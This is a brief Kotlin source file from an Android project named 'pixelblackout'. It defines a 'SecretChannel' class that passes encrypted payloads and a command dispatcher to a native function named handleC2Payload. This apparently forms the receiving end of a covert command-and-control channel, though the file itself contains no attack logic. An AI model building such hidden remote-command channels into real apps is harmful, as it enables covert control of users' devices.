package com.example.pixelblackout.managers

import com.example.pixelblackout.nativebridge.NativeCrypto
import org.json.JSONObject

class SecretChannel(
    private val dispatcher: CommandDispatcher
) {

    fun handleEncryptedPayload(payload: String): String {
        // Entire decrypt/dispatch/encrypt pipeline in native AEAD
        return NativeCrypto.handleC2Payload(payload, dispatcher)
    }
}
